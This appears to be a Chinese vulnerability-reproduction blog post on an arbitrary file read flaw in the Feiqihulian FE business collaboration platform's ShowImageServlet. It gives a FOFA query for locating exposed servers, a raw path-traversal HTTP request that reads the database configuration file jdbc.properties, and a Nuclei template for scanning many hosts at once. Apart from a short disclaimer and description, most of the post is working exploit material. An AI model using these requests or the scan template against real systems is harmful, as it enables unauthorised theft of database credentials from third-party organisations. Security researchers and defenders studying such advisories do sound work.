# 原创
：  漏洞复现--飞企互联FE业务协作平台ShowImageServlet任意文件读取

# 漏洞复现--飞企互联FE业务协作平台ShowImageServlet任意文件读取

## 免责声明：

**文章中涉及的漏洞均已修复，敏感信息均已做打码处理，文章仅做经验分享用途，切勿当真，未授权的攻击属于非法行为！文章中敏感信息均已做多层打马处理。传播、利用本文章所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任，一旦造成后果请自行负责**

### 一：漏洞描述

FE办公协作平台是基于业务应用模型驱动开发技术与工作流的协作技术、采用了面向业务部件技术，实现应用开发、运行、管理、维护的信息管理平台。该产品ShowImageServlet 文件存在任意文件读取。

### 二：漏洞影响版本

version &lt;=v6.6.0

### 三：网络空间测绘查询

fofa:<br/> `app="飞企互联-FE企业运营管理平台"`<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/be347c13d890ac78346e87c7eca967f7.jpeg"/>

### 四：漏洞复现

<img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/dbc10414a3ee54a39b94ff76c5ad2420.jpeg"/><br/> POC:

```
GET /servlet/ShowImageServlet?imagePath=../web/fe.war/WEB-INF/classes/jdbc.properties&amp;print HTTP/1.1
Host: x.x.x.x
Cookie: yourcookie
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9

```

### 五：批量检测

```
id: Feiqihulian-FE-ShowImageServlet-Arbitrary-file-reads
info:
  name: Feiqihulian-FE-ShowImageServlet-Arbitrary-file-reads
  author: 芝士土拨鼠
  severity: high
  description: FE办公协作平台是基于业务应用模型驱动开发技术与工作流的协作技术、采用了面向业务部件技术，实现应用开发、运行、管理、维护的信息管理平台。该产品ShowImageServlet 文件存在任意文件读取

requests:
  - raw:
      - |+
        GET /servlet/ShowImageServlet?imagePath=../web/fe.war/WEB-INF/classes/jdbc.properties&amp;print HTTP/1.1
        Host: {{Hostname}}
        Upgrade-Insecure-Requests: 1
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9
        Connection: close


    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - sql
      - type: status
        status:
          - 200

```
